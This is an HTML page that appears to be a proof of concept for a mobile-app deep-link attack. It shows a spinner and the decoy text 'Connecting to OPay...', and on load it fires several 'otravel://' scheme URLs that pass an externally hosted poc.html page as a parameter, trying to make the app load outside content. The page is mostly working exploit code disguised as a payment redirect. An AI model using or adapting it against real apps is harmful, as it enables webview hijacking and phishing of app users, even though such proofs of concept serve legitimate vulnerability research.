<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <style>
        body {
            font-family: sans-serif;
            background: #f7f9fb;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .spinner {
            border: 4px solid rgba(0, 0, 0, .1);
            width: 36px;
            height: 36px;
            border-radius: 50%;
            border-left-color: #00bf71;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }

            100% {
                transform: rotate(360deg);
            }
        }
    </style>
</head>

<body>
    <div style="text-align: center;">
        <div class="spinner" style="margin: 0 auto 20px;"></div>
        <p>Connecting to OPay...</p>
    </div>
    <script>
        window.onload = function () {
            var ts = Date.now();
            var pocUrl = 'https://zugonwobi.github.io/test/poc.html?cache=' + ts;
            var iosUrl = 'otravel://schemedispatcher?action=' + encodeURIComponent(pocUrl);

            // Try different parameters to ensure coverage
            window.location.href = iosUrl;

            setTimeout(function () {
                window.location.href = 'otravel://schemedispatcher?url=' + encodeURIComponent(pocUrl);
            }, 500);

            setTimeout(function () {
                window.location.href = 'otravel://common?scheme=' + encodeURIComponent(pocUrl);
            }, 1000);
        };
    </script>
</body>

</html>
